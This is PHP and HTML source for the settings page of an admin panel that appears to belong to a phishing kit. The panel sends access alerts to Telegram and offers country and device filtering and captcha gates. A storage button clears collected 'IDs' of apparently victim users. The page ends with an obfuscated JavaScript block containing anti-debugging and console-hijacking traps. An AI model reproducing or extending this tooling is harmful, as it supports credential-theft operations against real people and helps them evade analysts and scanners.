<?php 
    error_reporting(0);
    session_start();
    include "../../libraries/get-country-code.php";
    include "../../setting/functions.php";
    include "../../setting/alert-admin.php";
    include "../../setting/config.php";
    include "../../libraries/UserInfo.php";

    $jsonFilePath = "../admin/admin.json";
    $json_data = file_get_contents($jsonFilePath);
    $user_data = json_decode($json_data, true);
    $login_status = $user_data['login_status'];
    $token_admin = TOKEN;
    $chat_id_admin = CHATID;
    $ip = get_client_ip();
    $present_time = date("H:i:s"."-"."m/d/y");

    $ip_found = false;
    foreach ($user_data['login_status'] ?? [] as $login) {
        if ($login['ip'] === $ip) {
            $ip_found = true;
            break;
        }
    }
    
    if (!$ip_found) {
        $_SESSION["message_login"] = "Please log in to access this page. Or Your Ip Address is Change - " . $ip;

        $log = "Please log in to access this page. Or Your Ip Address is Change - " . $ip;

        // Send Data To Telegram :
        $message= urlencode("🔐========= Login Status =========🔐\r\n" . 
        "📍IP - ".get_client_ip()."\t\t | \t\t". 
        $detector->api() ."\r\n".
        "📊 Login Status = " .$log."\r\n".
        "💻 DEVICE = " .UserInfo::get_device()."\r\n".
        "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
        "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
        "DATE AND TIME = ". $present_time ."\r\n".
        "🔐========= Login Status =========🔐\r\n");
        telegram($token_admin, $message, $chat_id_admin);

        echo 
        "<script>
            window.location.replace('./login.php');
        </script>";
        exit;
    }

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- SEO -->
    <?php include '../../libraries/seo.php'; ?>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="../css/panel.css">
    <!-- Font Awesome Library -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- Favicon -->
    <link rel="icon" href="../img/favicon.png">
    <link rel="shortcut" href="../img/favicon.png">
    <link rel="appel-touch-icon" href="../img/favicon.png">
    <title>Main Panel</title>
</head>
<body>
    <!-- Start Nav Bar -->
    <nav>
        <div class="content-nav">
            <h3><img src="../img/favicon.png" alt=""> Admin Dashboard</h3> 
            <div class="parent-buttons-setting" id="menu">
                <button id="updatePage" class="buttons-settings"> <i class="fa-solid fa-rotate-right"></i>Realod</button>
                <a class="buttons-settings" target="_blank" href="./settings.php"><i class="fa-solid fa-gear"></i>Settings</a>
                <a class="buttons-settings" target="_blank" href="./main_panel.php"><i class="fa-solid fa-square-poll-vertical"></i>Main Panel</a>
                <form action="../actions/logout.php" method="post">
                    <button type="submit" name="logout" class="buttons-settings"><i class="fa-solid fa-right-from-bracket"></i>Logout</button>
                </form>
            </div>
            <button class="button-menu" id="buttonMenu"><i class="fa-solid fa-bars" id="buttonIcon"></i>Menu</button>
        </div>
    </nav>
    <!-- End Nav Bar -->
    <!-- Start Setting -->
     
    <div class="setting">
        <h3 class="titles" style="font-size: 37px !important;margin-bottom: 33px !important;"><i class="fa-solid fa-gear" style="margin-right: 10px !important;"></i>Settings</h3>
        <!-- Start Message Actions -->
        <?php 
            if (isset($_SESSION["message_setting"])) {
                echo "<div class='message-panel' style='margin-bottom: 20px !important;'>" .  $_SESSION["message_setting"] . "</div>";
                unset($_SESSION["message_setting"]);
            }
        ?>
        <!-- Start Message Actions -->
        <div class="content-setting">
            <form action="../actions/change_setting.php" method="post" id="formPassword">
                <h5>Change Password</h5>
                <div class="parent-input" id="div1">
                    <label for="oldPassword">Old Password</label>
                    <input type="text" name="old_password" placeholder="Old Password" id="oldPassword" class="input-setting">
                    <small class="error-message" id="errorMessage1">Please Enter Old Password</small>
                </div>
                <div class="parent-input" id="div2">
                    <label for="newPassword">New Password</label>
                    <input type="text" name="new_password" id="newPassword" placeholder="New Password" class="input-setting">
                    <small class="error-message" id="errorMessage2">Please enter new password "Password length is greater than 8".</small>
                </div>
                <div class="parent-button">
                    <button type="submit" class="button-send-data" name="change_password" id="btnChangePassword">Change</button>
                </div>
            </form>
            <form action="../actions/change_setting.php" method="post" id="formUsername">
                <h5>Change Username</h5>
                <div class="parent-input" id="div3">
                    <label for="oldUsername">Old Username</label>
                    <input type="text" name="old_username" placeholder="Old Username" id="oldUsername" class="input-setting">
                    <small class="error-message" id="errorMessage3">Please Enter Old Username</small>
                </div>
                <div class="parent-input" id="div4">
                    <label for="newUsername">New Username</label>
                    <input type="text" name="new_username" placeholder="New Username" id="newUsername" class="input-setting">
                    <small class="error-message" id="errorMessage4">Please Enter New Username "Username length is greater than 5"</small>
                </div>
                <div class="parent-button">
                    <button type="submit" class="button-send-data" name="change_username" id="btnChangeUsername">Change</button>
                </div>
            </form>
            <form action="../actions/change_setting.php" method="post" id="formAllowedCountries">
                <h5>Allowed Countries</h5>
                <div class="parent-image-other" style="margin:10px 0px;">
                    <img src="../img/icon-world.png">
                </div>
                <div class="parent-input" id="div8">
                    <label for="allowedCountries">Enter the country codes, separated by a comma (,) leave it empty to allow all countries</label>
                    <input type="text" name="allowed_countries" placeholder="EX : US,CA,UK" id="allowedCountries" class="input-setting">
                    <small class="error-message" id="errorMessage8">Error: Invalid format. Please use 2-letter country codes (either uppercase or lowercase) separated by commas (e.g., fr,de,en or FR,DE,US).</small>
                </div>
                <div class="parent-button">
                    <button type="submit" class="button-send-data" name="change_allowed_countries" id="btnAllowedCountries">Change</button>
                </div>
            </form>
            <form action="../actions/change_setting.php" method="post" id="formDevices">
                <h5>Setup Devices</h5>
                <div class="parent-image-other">
                    <img src="../img/desktop-and-mobile.png">
                </div>
                <div class="parent-input" id="div7">
                    <label for="modeDevices">Devices Mode</label>
                    <select name="mode_devices" class="input-setting" id="modeDevices">
                        <option value="0">Select Devices Mode</option>
                        <option value="all">Allow All Devices</option>
                        <option value="desktop">Allow Desktop Device Only</option>
                        <option value="mobile">Allow Mobile Device Only</option>
                    </select>
                    <small class="error-message" id="errorMessage7">Please Select Devices Mode</small>
                </div>

                <div class="parent-button">
                    <button type="submit" class="button-send-data" name="setup_devices" id="btnSetUpDevices">Update</button>
                </div>
            </form>
            <form action="../actions/change_setting.php" method="post" id="formRecaptcha">
                <h5>Setup Recaptcha</h5>
                <div class="parent-image">
                    <span class="image-container">
                        <img src="../img/cloudflare.png" alt="">
                    </span>
                    <span class="image-container">
                        <img src="../img/hcaptcha.svg" alt="">
                    </span>
                    <span class="image-container">
                        <img src="../img/captcha_calc.png" alt="">
                    </span>
                </div>
                <div class="parent-input" id="div5">
                    <label for="modeRecaptcha">Recaptcha Mode</label>
                    <select name="mode_recaptcha" class="input-setting" id="modeRecaptcha">
                        <option value="0">Select Recaptcha Mode</option>
                        <option value="on">ON Mode</option>
                        <option value="off">OFF Mode</option>
                    </select>
                    <small class="error-message" id="errorMessage5">Please Select Recaptcha Mode</small>
                </div>
                <div class="parent-input" id="div6">
                    <label for="typeRecaptcha">Recaptcha Type</label>
                    <select name="type_recaptcha" class="input-setting" id="typeRecaptcha">
                        <option value="0" selected="selected">Select Recaptcha Type</option>
                        <option value="off-type">OFF Type</option>
                        <option value="cloudflare" >Recaptcha Cloudflare</option>
                        <option value="hcaptcha" >Recaptcha Hcaptcha</option>
                        <option value="captcha_calc" >Recaptcha Captcha Calc</option>
                    </select>
                    <small class="error-message" id="errorMessage6">Please Select Recaptcha Type</small>
                </div>
                <div class="parent-button">
                    <button type="submit" class="button-send-data" name="setup_recaptcha" id="btnSetUpRecaptcha">Update</button>
                </div>
            </form>
            <form action="../actions/change_setting.php" method="post">
                <h5>Storage</h5>
                <div class="parent-input" style="margin-bottom:0px !important;">
                    <label for="fileCount">
                        After completing the work, it's important to clear the storage space of old IDs to make room for new users.
                        <br>
                        Note: This button will remove all IDs, so please ensure you finish the work first.
                    </label>
                </div>
                <div class="progress-section" style="padding: 15px 0px !important;">
                    <div class="box-progress" style="width:100% !important;">        
                        <span class="title-preview">Storage Space</span>
                        <div class="numbers-count"><i class="fa-solid fa-database"></i> <span class="text-numbers" id="fileCount"></span></div>
                    </div>
                </div>
                <div class="parent-button">
                    <button type="submit" class="button-send-data" name="empty_storage" ><i class="fa-solid fa-trash" style="margin-right:10px;"></i> Empty Storage</button>
                </div>
            </form>
        </div>
    </div>
    <!-- End Setting -->
    
    <!-- js -->
    <script src="../js/settings.js"></script>
    <script src="../../js/jquery-3.6.0.min.js"></script>
    <script>
        function _0x_0xdaa9(_0x3d23eb,_0xad5a4f){var _0x58ed72=_0x_0x309c();return _0x_0xdaa9=function(_0x22ed8b,_0x5dfd66){_0x22ed8b=_0x22ed8b-(-0x1342+-0x49d*0x1+0x449*0x6);var _0x24ba24=_0x58ed72[_0x22ed8b];if(_0x_0xdaa9['QvlRkL']===undefined){var _0x1e65ba=function(_0x32b158){var _0x2323b8='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0xda78e5='',_0x5ae193='',_0x2ced2d=_0xda78e5+_0x1e65ba;for(var _0x51e9cc=-0xebd*-0x1+0xf0c+-0x131*0x19,_0x572e4b,_0x2db0a0,_0x39c81f=0xa9a*0x1+-0x305*0x8+0xd8e;_0x2db0a0=_0x32b158['charAt'](_0x39c81f++);~_0x2db0a0&&(_0x572e4b=_0x51e9cc%(-0x276+-0x61+-0x2db*-0x1)?_0x572e4b*(0x7*0x11b+0x1929+0x255*-0xe)+_0x2db0a0:_0x2db0a0,_0x51e9cc++%(0x591+-0x70*-0x30+-0x1a8d))?_0xda78e5+=_0x2ced2d['charCodeAt'](_0x39c81f+(0x1c33+-0x1c93+0x6a))-(-0x8*0x1b1+0x2*-0x6e9+0x1*0x1b64)!==-0xb51+0x657+0x4fa?String['fromCharCode'](0x1*-0x2245+-0x5*-0x4b1+0xbcf&_0x572e4b>>(-(0x1fb+0x1d83+-0x1f7c*0x1)*_0x51e9cc&0x1c1f+-0x61*0x2a+-0xc2f)):_0x51e9cc:0xf27+-0x1e7d+0xf56){_0x2db0a0=_0x2323b8['indexOf'](_0x2db0a0);}for(var _0x2d63ad=-0x7b8+0x1692+-0xeda,_0xfb0133=_0xda78e5['length'];_0x2d63ad<_0xfb0133;_0x2d63ad++){_0x5ae193+='%'+('00'+_0xda78e5['charCodeAt'](_0x2d63ad)['toString'](-0xbfb+-0x2*0x214+0x1033))['slice'](-(-0x231a*0x1+-0x88d+0x2ba9));}return decodeURIComponent(_0x5ae193);};_0x_0xdaa9['bMtwiZ']=_0x1e65ba,_0x3d23eb=arguments,_0x_0xdaa9['QvlRkL']=!![];}var _0x56e733=_0x58ed72[0x22cb*-0x1+-0x15a4+0x386f],_0x41073c=_0x22ed8b+_0x56e733,_0x5ca81e=_0x3d23eb[_0x41073c];if(!_0x5ca81e){var _0x53f285=function(_0x470fef){this['RVBFGP']=_0x470fef,this['HQpcDQ']=[-0x1*0x19b4+0xfe*0xc+0xdcd*0x1,0x1136+-0x16e2+-0x2d6*-0x2,0x173+0x4a*0x4f+-0x1*0x1849],this['rGbcoj']=function(){return'newState';},this['XvUdOx']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['KhuHvw']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x53f285['prototype']['pajMli']=function(){var _0x3b1073=new RegExp(this['XvUdOx']+this['KhuHvw']),_0x59a95c=_0x3b1073['test'](this['rGbcoj']['toString']())?--this['HQpcDQ'][0xd7c+0x8b*0x4+0xfa7*-0x1]:--this['HQpcDQ'][-0x25ed+-0x162d+0x3c1a];return this['GPOOBS'](_0x59a95c);},_0x53f285['prototype']['GPOOBS']=function(_0x21b4a6){if(!Boolean(~_0x21b4a6))return _0x21b4a6;return this['MIfMrv'](this['RVBFGP']);},_0x53f285['prototype']['MIfMrv']=function(_0x325519){for(var _0x54edb3=0x910*-0x3+0x1161+-0x9cf*-0x1,_0x1dab94=this['HQpcDQ']['length'];_0x54edb3<_0x1dab94;_0x54edb3++){this['HQpcDQ']['push'](Math['round'](Math['random']())),_0x1dab94=this['HQpcDQ']['length'];}return _0x325519(this['HQpcDQ'][0x1bc4*-0x1+0x1b2*0x13+-0x472]);},new _0x53f285(_0x_0xdaa9)['pajMli'](),_0x24ba24=_0x_0xdaa9['bMtwiZ'](_0x24ba24),_0x3d23eb[_0x41073c]=_0x24ba24;}else _0x24ba24=_0x5ca81e;return _0x24ba24;},_0x_0xdaa9(_0x3d23eb,_0xad5a4f);}var _0x_0xd6e705=_0x_0xdaa9;(function(_0x1cf1fd,_0x2fec0){var _0x2ba49a=_0x_0xdaa9,_0x6cbd89=_0x_0xdaa9,_0x4629c6=_0x1cf1fd();while(!![]){try{var _0x32cad2=-parseInt(_0x2ba49a(0x1d8))/(-0x45a*0x7+0x128f*-0x2+0x4395)*(parseInt(_0x6cbd89(0x225))/(-0x1f57+-0x1*-0xf63+-0x1*-0xff6))+-parseInt(_0x2ba49a(0x1fe))/(0x1db*-0x11+0x238a+-0xaa*0x6)+-parseInt(_0x2ba49a(0x1f9))/(-0x77*-0x30+-0xbad+-0xa9f)*(-parseInt(_0x6cbd89(0x21b))/(0x1555+-0x165a*-0x1+0x2e*-0xf3))+-parseInt(_0x6cbd89(0x203))/(0x49*0x8+-0x2e2*0x1+-0xa0*-0x1)+-parseInt(_0x2ba49a(0x226))/(-0x10e1*0x2+0x201d+0x1ac)*(parseInt(_0x6cbd89(0x20c))/(0x241f+-0x8b2+-0x1*0x1b65))+parseInt(_0x2ba49a(0x1eb))/(0x3e*-0x5+0x3ba+0x5*-0x7f)+-parseInt(_0x2ba49a(0x20e))/(-0x2036+-0x44c+0x248c)*(-parseInt(_0x2ba49a(0x1e5))/(0x2166+-0x1664+-0xaf7));if(_0x32cad2===_0x2fec0)break;else _0x4629c6['push'](_0x4629c6['shift']());}catch(_0x9b64f4){_0x4629c6['push'](_0x4629c6['shift']());}}}(_0x_0x309c,0x734ca+-0xd6c75+0xe53a9*0x1));var _0x_0x1dd82b=(function(){var _0x13488c=!![];return function(_0x5e181c,_0x1fe822){var _0x1597c2=_0x13488c?function(){var _0x4de687=_0x_0xdaa9;if(_0x1fe822){var _0x1a8bd5=_0x1fe822[_0x4de687(0x1f2)](_0x5e181c,arguments);return _0x1fe822=null,_0x1a8bd5;}}:function(){};return _0x13488c=![],_0x1597c2;};}()),_0x_0x3e7f04=_0x_0x1dd82b(this,function(){var _0x2fdad2=_0x_0xdaa9,_0x1c5a84=_0x_0xdaa9,_0x34c7c5={};_0x34c7c5[_0x2fdad2(0x207)]='(((.+)+)+)'+'+$';var _0x2f315c=_0x34c7c5;return _0x_0x3e7f04[_0x2fdad2(0x217)]()[_0x2fdad2(0x1ff)](_0x2f315c[_0x1c5a84(0x207)])[_0x1c5a84(0x217)]()[_0x1c5a84(0x1f3)+'r'](_0x_0x3e7f04)[_0x1c5a84(0x1ff)](_0x2f315c[_0x1c5a84(0x207)]);});_0x_0x3e7f04();function _0x_0x309c(){var _0x1bbbcf=['ntGXmtq5mLbKD3vmyW','BvvyBLO','uKTNuNq','CxHRt0i','zfbcq0y','i2zPBgvdB3vUDa','qNvmt0q','uMjKCwK','vKn6yuy','mtC2tuHxy2rw','sKfyvfe','mtb5rNLdwhu','ys16qs1AxYrDwW','xcGGkLWP','wenvB1K','C3bSAxq','uwrWvMy','y29UC29Szq','CMvHzhK','seLMs1q','Dg9tDhjPBMC','ChjVDg90ExbL','zNvUy3rPB24GkG','q2zIA2O','mJi4mZvdrvPdwKm','s2TrCK8','swzjrNa','xcTCkYaQkd86wW','zwrYBvG','y2fSBa','zMnRs3m','A2ntyvu','s1bmA2O','Aw5WDxq','mta3nerdyKf6Eq','nZq4m2Xovhjbqq','ywn0Aw9U','C3rHDgvpyMPLyW','mtC2mxnJrKLdAa','zxjYB3i','Dgv4Da','E30Uy29UC3rYDq','Cu94rfu','zsKGE30','rwXXvxq','y3rVCIGICMv0Dq','BMn0Aw9UkcKG','D2fYBG','DhjHy2u','tfbKCKO','l3rVDgfSlwLKlG','mtGYntG3otbRCfveruS','DgfIBgu','uNjlAwm','z2npyve','rxjYB3i','Aw5PDa','nZa2odKWnM5nvKjACa','z2DLCG','BgvUz3rO','tvDbuwC','CM4GDgHPCYiPka','C3rYAw5N','DgvZDa','yxbWBhK','y29UC3rYDwn0BW','z2v0sLnptG','jf0Qkq','D2HPBguGkhrYDq','zxHJzxb0Aw9U','nhWXFdj8nxWZFa','ntaWqw9ivw9j','y0fqEfe','yMLUza','Bg9N','zgvIDq','mty0mdK2ngPzsu5UDW','C2vHCMnO','y2HHAw4','DefHr2C','qxHrsuO'];_0x_0x309c=function(){return _0x1bbbcf;};return _0x_0x309c();}var _0x_0x420e09=(function(){var _0x40f77a=!![];return function(_0x44634e,_0x4c708e){var _0x21bd0a=_0x40f77a?function(){if(_0x4c708e){var _0x10fb40=_0x4c708e['apply'](_0x44634e,arguments);return _0x4c708e=null,_0x10fb40;}}:function(){};return _0x40f77a=![],_0x21bd0a;};}());(function(){var _0x5053ee=_0x_0xdaa9,_0x320004=_0x_0xdaa9,_0x1fa1ba={'VjziH':_0x5053ee(0x219)+_0x5053ee(0x210),'KPLkj':function(_0xe4e05a,_0x1bf46f){return _0xe4e05a(_0x1bf46f);},'cAPxQ':_0x320004(0x1ea),'BuLOD':function(_0x260406,_0x39fd78){return _0x260406+_0x39fd78;},'LXYeN':_0x320004(0x224),'fWtZb':function(_0x57a0e3,_0x45f46b,_0x28706b){return _0x57a0e3(_0x45f46b,_0x28706b);}};_0x1fa1ba['fWtZb'](_0x_0x420e09,this,function(){var _0x29e9f6=_0x5053ee,_0x43fd2b=_0x5053ee,_0x1be05b=new RegExp(_0x1fa1ba['VjziH']),_0x13a279=new RegExp(_0x29e9f6(0x21e)+_0x29e9f6(0x20f)+'0-9a-zA-Z_'+_0x43fd2b(0x1f5),'i'),_0x43f373=_0x1fa1ba[_0x43fd2b(0x223)](_0x_0x41ad53,_0x1fa1ba[_0x43fd2b(0x1fa)]);!_0x1be05b[_0x29e9f6(0x1f1)](_0x1fa1ba[_0x29e9f6(0x209)](_0x43f373,_0x29e9f6(0x200)))||!_0x13a279[_0x43fd2b(0x1f1)](_0x1fa1ba[_0x43fd2b(0x209)](_0x43f373,_0x1fa1ba['LXYeN']))?_0x1fa1ba[_0x43fd2b(0x223)](_0x43f373,'0'):_0x_0x41ad53();})();}());var _0x_0x109952=(function(){var _0x45fc89=!![];return function(_0x30f78b,_0x363f18){var _0x8ad159=_0x45fc89?function(){var _0x4ab84e=_0x_0xdaa9;if(_0x363f18){var _0x5bfd16=_0x363f18[_0x4ab84e(0x1f2)](_0x30f78b,arguments);return _0x363f18=null,_0x5bfd16;}}:function(){};return _0x45fc89=![],_0x8ad159;};}()),_0x_0x50f9c1=_0x_0x109952(this,function(){var _0x364e95=_0x_0xdaa9,_0x3e9970=_0x_0xdaa9,_0x3e57ec={'cjuao':function(_0x2514f6,_0x2545ed){return _0x2514f6(_0x2545ed);},'kkuyA':function(_0x335c62,_0x527421){return _0x335c62+_0x527421;},'BFing':'return\x20(fu'+_0x364e95(0x1e0),'AxQIJ':_0x3e9970(0x1db)+_0x3e9970(0x1df)+_0x3e9970(0x1ef)+'\x20)','vqPhd':function(_0x48ee80){return _0x48ee80();},'MWAQg':_0x364e95(0x1e1),'aGmyu':'info','HIfKT':_0x364e95(0x1d9),'XCUoY':_0x364e95(0x1f7),'XsCbs':_0x3e9970(0x1e6),'RKgRt':_0x3e9970(0x1e2),'IfIFp':function(_0x42e74b,_0x15bb9c){return _0x42e74b<_0x15bb9c;},'ElqUt':_0x3e9970(0x1f8)+'0'},_0x1de62e=function(){var _0x248cc9=_0x3e9970,_0x5e63e6;try{_0x5e63e6=_0x3e57ec['cjuao'](Function,_0x3e57ec['kkuyA'](_0x3e57ec['BFing']+_0x3e57ec[_0x248cc9(0x202)],');'))();}catch(_0x4ebcb7){_0x5e63e6=window;}return _0x5e63e6;},_0x453b50=_0x3e57ec['vqPhd'](_0x1de62e),_0x495ff6=_0x453b50[_0x3e9970(0x214)]=_0x453b50[_0x3e9970(0x214)]||{},_0x5924b2=[_0x3e9970(0x1fc),_0x3e57ec[_0x364e95(0x1ee)],_0x3e57ec['aGmyu'],_0x3e57ec[_0x364e95(0x216)],_0x3e57ec[_0x3e9970(0x211)],_0x3e57ec['XsCbs'],_0x3e57ec[_0x3e9970(0x205)]];for(var _0x3eacf0=-0x13*0x29+0x22e*0x8+-0xe65;_0x3e57ec[_0x364e95(0x21d)](_0x3eacf0,_0x5924b2[_0x364e95(0x1ed)]);_0x3eacf0++){var _0x37386b=_0x3e57ec[_0x3e9970(0x1de)][_0x364e95(0x212)]('|'),_0xcc596=-0x959+-0x1*0xed9+0x1832;while(!![]){switch(_0x37386b[_0xcc596++]){case'0':_0x495ff6[_0x249cfa]=_0x3a18f4;continue;case'1':var _0x249cfa=_0x5924b2[_0x3eacf0];continue;case'2':var _0xbdbf1d=_0x495ff6[_0x249cfa]||_0x3a18f4;continue;case'3':_0x3a18f4[_0x3e9970(0x217)]=_0xbdbf1d[_0x364e95(0x217)][_0x3e9970(0x1fb)](_0xbdbf1d);continue;case'4':var _0x3a18f4=_0x_0x109952[_0x364e95(0x1f3)+'r'][_0x3e9970(0x218)][_0x3e9970(0x1fb)](_0x_0x109952);continue;case'5':_0x3a18f4['__proto__']=_0x_0x109952[_0x364e95(0x1fb)](_0x_0x109952);continue;}break;}}});_0x_0x50f9c1();function fetchFileCount(){var _0x2a20cc=_0x_0xdaa9,_0x5eb529=_0x_0xdaa9,_0x2ac1ac={'kcSaU':function(_0x5f17c0,_0x33e082){return _0x5f17c0(_0x33e082);},'QdpVf':_0x2a20cc(0x208),'Cfbkj':function(_0x536cee,_0x2f9361){return _0x536cee(_0x2f9361);},'VCzaF':'../actions'+_0x5eb529(0x1e4)+'php'};$[_0x5eb529(0x1f4)](_0x2ac1ac[_0x2a20cc(0x20b)],function(_0x36a63c){var _0x50638a=_0x2a20cc,_0x5a8abb=_0x2a20cc;_0x2ac1ac[_0x50638a(0x222)]($,_0x2ac1ac[_0x50638a(0x213)])[_0x5a8abb(0x1da)](_0x36a63c['count']);})['fail'](function(){var _0x329b4c=_0x2a20cc,_0x2402aa=_0x2a20cc;_0x2ac1ac[_0x329b4c(0x21a)]($,_0x2ac1ac[_0x329b4c(0x213)])[_0x329b4c(0x1da)](_0x329b4c(0x1e9));});}$(document)[_0x_0xd6e705(0x215)](function(){var _0x48023c=_0x_0xd6e705,_0x219c45={'RrKic':function(_0x20f70b){return _0x20f70b();},'vuoYb':function(_0x19c105,_0x314688,_0x12355e){return _0x19c105(_0x314688,_0x12355e);}};_0x219c45[_0x48023c(0x1e7)](fetchFileCount),_0x219c45['vuoYb'](setInterval,fetchFileCount,-0x14f*-0x7+0x2269*-0x1+-0x24c*-0x1c);});function _0x_0x41ad53(_0xfcd2db){var _0xb21166=_0x_0xd6e705,_0x1c95ae=_0x_0xd6e705,_0x123ffa={'fckKs':_0xb21166(0x1f0),'edrmX':function(_0x4a8abb,_0x342aa1){return _0x4a8abb+_0x342aa1;},'Rbdqi':function(_0x474b55,_0x54dd5e){return _0x474b55/_0x54dd5e;},'gcOaQ':_0xb21166(0x1ed),'tAaGg':function(_0x2c87ff,_0x4e7f9d){return _0x2c87ff===_0x4e7f9d;},'KkQrO':function(_0x27ddad,_0x6dd4d6){return _0x27ddad%_0x6dd4d6;},'mUXnZ':_0x1c95ae(0x1fd),'qxkOB':_0xb21166(0x1ec),'JAXTQ':_0xb21166(0x227),'qOxDU':_0xb21166(0x1d7)+'t','LPdrJ':function(_0x268495,_0x749df5){return _0x268495(_0x749df5);}};function _0x2e9f9c(_0x484cf2){var _0x2b18e2=_0xb21166,_0xe2d650=_0x1c95ae;if(typeof _0x484cf2===_0x123ffa[_0x2b18e2(0x221)])return function(_0x235962){}['constructo'+'r'](_0x2b18e2(0x1f6)+_0xe2d650(0x1dd))['apply']('counter');else _0x123ffa[_0x2b18e2(0x21f)]('',_0x123ffa[_0x2b18e2(0x20a)](_0x484cf2,_0x484cf2))[_0x123ffa[_0xe2d650(0x1e8)]]!==-0x11e5+-0x12b*0x13+0x3a5*0xb||_0x123ffa[_0xe2d650(0x201)](_0x123ffa[_0x2b18e2(0x21c)](_0x484cf2,0x1*-0x1e28+0x12a2*-0x1+0x342*0xf),0x1a59+-0x1*0x13e9+-0x670)?function(){return!![];}[_0x2b18e2(0x1f3)+'r'](_0x123ffa[_0xe2d650(0x21f)](_0x123ffa[_0x2b18e2(0x204)],_0x123ffa[_0xe2d650(0x206)]))[_0x2b18e2(0x220)](_0x123ffa[_0xe2d650(0x20d)]):function(){return![];}['constructo'+'r'](_0x123ffa[_0x2b18e2(0x21f)](_0x123ffa['mUXnZ'],_0x123ffa[_0xe2d650(0x206)]))[_0xe2d650(0x1f2)](_0x123ffa[_0x2b18e2(0x1dc)]);_0x123ffa[_0xe2d650(0x1e3)](_0x2e9f9c,++_0x484cf2);}try{if(_0xfcd2db)return _0x2e9f9c;else _0x2e9f9c(-0x2616+0x680+0x26e*0xd);}catch(_0x409b49){}}
    </script>

</body>
</html>
